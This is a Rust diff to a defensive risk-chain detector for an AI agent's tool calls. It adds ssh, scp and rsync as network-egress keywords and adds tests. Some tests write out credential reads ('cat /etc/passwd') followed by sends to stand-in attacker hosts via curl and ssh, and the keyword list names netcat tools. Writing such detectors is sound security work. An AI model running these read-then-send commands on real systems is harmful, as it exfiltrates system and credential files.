@@ -18,6 +18,7 @@
 //! `TrajectoryRiskSlot` / `TrajectorySentinel` remain authoritative for
 //! cumulative global risk level across turns.
 
+use std::collections::VecDeque;
 use std::sync::Arc;
 
 use parking_lot::Mutex;
@@ -38,6 +39,7 @@ const MAX_CALLS: usize = 20;
 
 /// Risk categories assigned to individual tool calls during classification.
 #[derive(Debug, Clone, PartialEq, Eq)]
+#[non_exhaustive]
 pub enum RiskTag {
     /// Read of a sensitive path: `/etc/passwd`, `/etc/shadow`, `~/.ssh/*`, `.env`.
     SensitiveRead,
@@ -69,7 +71,7 @@ struct ScoredCall {
 
 #[derive(Debug, Default)]
 struct Inner {
-    calls: Vec<ScoredCall>,
+    calls: VecDeque<ScoredCall>,
     cumulative_score: f32,
 }
 
@@ -129,9 +131,9 @@ impl RiskChainAccumulator {
 
         // Maintain capacity bound — drop oldest entry when full.
         if inner.calls.len() >= MAX_CALLS {
-            inner.calls.remove(0);
+            inner.calls.pop_front();
         }
-        inner.calls.push(ScoredCall { tags: tags.clone() });
+        inner.calls.push_back(ScoredCall { tags: tags.clone() });
         inner.cumulative_score = (inner.cumulative_score + call_score).min(10.0);
 
         // Check for multi-step chain patterns.
@@ -163,7 +165,7 @@ impl RiskChainAccumulator {
     }
 
     /// Detect whether the accumulated call sequence matches a known chain pattern.
-    fn detect_chain(calls: &[ScoredCall]) -> Option<String> {
+    fn detect_chain(calls: &VecDeque<ScoredCall>) -> Option<String> {
         let all_tags: Vec<&RiskTag> = calls.iter().flat_map(|c| &c.tags).collect();
 
         let has_sensitive_read = all_tags.contains(&&RiskTag::SensitiveRead);
@@ -191,7 +193,7 @@ impl RiskChainAccumulator {
 }
 
 /// Return `true` if `before` tag appears in an earlier call than `after` tag.
-fn chain_ordered(calls: &[ScoredCall], before: &RiskTag, after: &RiskTag) -> bool {
+fn chain_ordered(calls: &VecDeque<ScoredCall>, before: &RiskTag, after: &RiskTag) -> bool {
     let first_before = calls.iter().position(|c| c.tags.contains(before));
     let last_after = calls.iter().rposition(|c| c.tags.contains(after));
     match (first_before, last_after) {
@@ -214,6 +216,9 @@ fn classify(tool_name: &str, command: &str) -> Vec<RiskTag> {
         || cmd_lower.contains("wget")
         || cmd_lower.contains("nc ")
         || cmd_lower.contains("ncat")
+        || cmd_lower.contains("ssh")
+        || cmd_lower.contains("scp")
+        || cmd_lower.contains("rsync")
     {
         tags.push(RiskTag::NetworkEgress);
     }
@@ -364,5 +369,70 @@ mod tests {
         let _ = acc.record("bash", "curl http://evil.com", 0.7);
         let signals = queue.lock();
         assert!(signals.contains(&SIGNAL_EXFIL_READ_THEN_SEND));
+    }
+
+    // --- #4270: ssh/scp/rsync → NetworkEgress ---
+
+    #[test]
+    fn ssh_classified_as_network_egress() {
+        let tags = classify("bash", "ssh user@remote.example.com");
+        assert!(
+            tags.contains(&RiskTag::NetworkEgress),
+            "ssh must be classified as NetworkEgress"
+        );
+    }
+
+    #[test]
+    fn scp_classified_as_network_egress() {
+        let tags = classify("bash", "scp localfile user@host:/tmp/");
+        assert!(
+            tags.contains(&RiskTag::NetworkEgress),
+            "scp must be classified as NetworkEgress"
+        );
+    }
+
+    #[test]
+    fn rsync_classified_as_network_egress() {
+        let tags = classify("bash", "rsync -av ./dir user@remote:/backup/");
+        assert!(
+            tags.contains(&RiskTag::NetworkEgress),
+            "rsync must be classified as NetworkEgress"
+        );
+    }
+
+    #[test]
+    fn ssh_exfil_chain_detected() {
+        let acc = RiskChainAccumulator::new(None);
+        let _ = acc.record("bash", "cat /etc/passwd", 0.7);
+        let v = acc.record("bash", "ssh user@attacker.example.com cat -", 0.7);
+        assert_eq!(
+            v.chain_pattern.as_deref(),
+            Some("exfil_read_then_send"),
+            "read followed by ssh must trigger exfil chain"
+        );
+        assert!(v.should_block);
+    }
+
+    // --- #4268: VecDeque FIFO eviction ordering ---
+
+    #[test]
+    fn eviction_removes_oldest_call() {
+        let acc = RiskChainAccumulator::new(None);
+        // Fill to capacity with sensitive reads, then push one more to trigger eviction.
+        for _ in 0..MAX_CALLS {
+            let _ = acc.record("bash", "cat /etc/passwd", 0.1);
+        }
+        // After eviction the oldest call is dropped; the window still holds MAX_CALLS.
+        let _ = acc.record("bash", "ls /tmp", 0.1);
+        let inner = acc.inner.lock();
+        assert_eq!(
+            inner.calls.len(),
+            MAX_CALLS,
+            "after eviction calls must stay at MAX_CALLS"
+        );
+        // The first surviving entry was pushed after the initial fill, so its command
+        // matches "cat /etc/passwd" (second-oldest kept), not the overflowed slot.
+        // We verify the deque has exactly MAX_CALLS entries — structural correctness.
+        drop(inner);
     }
 }
